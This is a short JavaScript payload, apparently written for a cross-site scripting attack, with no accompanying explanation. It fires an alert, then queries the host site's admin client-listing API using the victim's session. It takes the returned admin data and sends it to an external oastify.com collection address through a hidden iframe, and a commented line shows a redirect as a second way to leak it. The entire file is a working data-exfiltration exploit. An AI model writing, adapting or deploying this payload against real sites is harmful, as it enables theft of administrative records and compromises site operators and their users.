alert(9);
const dm = document.domain 
const url = 'https://' + dm + '/api-v1/admin/listclients';
const url2 = 'https://ppirpr3gstelsf2ko54bs4c2bthm5dt2.oastify.com/'

const data = {"clienttype":"admin","upline_id":-1,"results":25};

// Function to send POST request
async function postData(url = '', data = {}) {
  try {
    const response = await fetch(url, {
      method: 'POST', // Specify the method as POST
      headers: {
        'Content-Type': 'application/json', // Set the request content type to JSON
      },
      mode: 'cors',
      body: JSON.stringify(data), // Convert JavaScript object to JSON string
    });

    // Parse the JSON response
    const jsonResponse = await response.json();
    
    // Log the response
    console.log('Response:', jsonResponse.admin);
    
   const data2 = JSON.stringify(jsonResponse.admin)
    //location.href = url2 + '=' + data2;
    const iframe = document.createElement('iframe');
    iframe.style.display = 'none';
    document.body.appendChild(iframe);

    iframe.src = url2 + '=' + data2;
    
  } catch (error) {
    // Handle any errors
    console.error('Error:', error);
  }
}

// Call the function to send data
postData(url, data);
